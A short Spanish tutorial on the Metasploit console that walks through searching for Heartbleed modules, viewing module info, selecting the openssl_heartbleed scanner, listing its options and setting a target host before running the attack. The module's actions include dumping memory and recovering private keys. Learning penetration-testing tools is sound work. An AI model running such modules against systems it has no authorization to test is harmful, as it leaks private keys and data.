# Interfaz de metasploit

**Al iniciar metasploit con el comando msfconsole vemos esto:**

```
msf > 
```

**para buscar modulos usamos el comando `search` + palabra:**

```
msf > search heartbleed

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank    Check  Description
   -  ----                                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/elasticsearch_memory_disclosure  2021-07-21       normal  Yes    Elasticsearch Memory Disclosure
   1    \_ action: DUMP                                       .                .       .      Dump memory contents to loot
   2    \_ action: SCAN                                       .                .       .      Check hosts for vulnerability
   3  auxiliary/server/openssl_heartbeat_client_memory        2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
   4  auxiliary/scanner/ssl/openssl_heartbleed                2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak
   5    \_ action: DUMP                                       .                .       .      Dump memory contents to loot
   6    \_ action: KEYS                                       .                .       .      Recover private keys from memory
   7    \_ action: SCAN                                       .                .       .      Check hosts for vulnerability


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/ssl/openssl_heartbleed
After interacting with a module you can manually set a ACTION with set ACTION 'SCAN'

msf > 

```

**Para ver informacion sobre un módulo usamos el comando `info`:**

```
msf > info auxiliary/scanner/ssl/openssl_heartbleed

       Name: OpenSSL Heartbeat (Heartbleed) Information Leak
     Module: auxiliary/scanner/ssl/openssl_heartbleed
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2014-04-07

Provided by:
  Neel Mehta
  Riku
  Antti
  Matti
  Jared Stafford <jspenguin@jspenguin.org>
  FiloSottile
  Christian Mehlmauer <FireFart@gmail.com>...
```

**Para usar un modulo  ponemos `use` + la ruta del módulo o el número del modulo que se le asigna al hacer la búsqueda:**

```
msf > use  auxiliary/scanner/ssl/openssl_heartbleed
[*] Setting default action SCAN - view all 3 actions with the show actions command
msf auxiliary(scanner/ssl/openssl_heartbleed) > 
```

**O**

```
msf > use 4
[*] Setting default action SCAN - view all 3 actions with the show actions command
msf auxiliary(scanner/ssl/openssl_heartbleed) > 
```

**Dentro del modulo tenemos varios comandos, como `options` para ver las opciones del módulo:**

```
msf auxiliary(scanner/ssl/openssl_heartbleed) > options

Module options (auxiliary/scanner/ssl/openssl_heartbleed):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DUMPFILTER                         no        Pattern to filter leaked memory before storing
   LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP invocation
   MAX_KEYTRIES      50               yes       Max tries to dump key
   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             443              yes       The target port (TCP)
   STATUS_EVERY      5                yes       How many retries until key dump status
   THREADS           1                yes       The number of concurrent threads (max one per host)

```

**Otro comando es `set` para dar un valor a una opcion del módulo:**

```
msf auxiliary(scanner/ssl/openssl_heartbleed) > set rhosts target.com
rhosts => target.com
```

**Y otro comando es `run` o `exploit` para ejecutar el modulo y comenzar el ataque.**
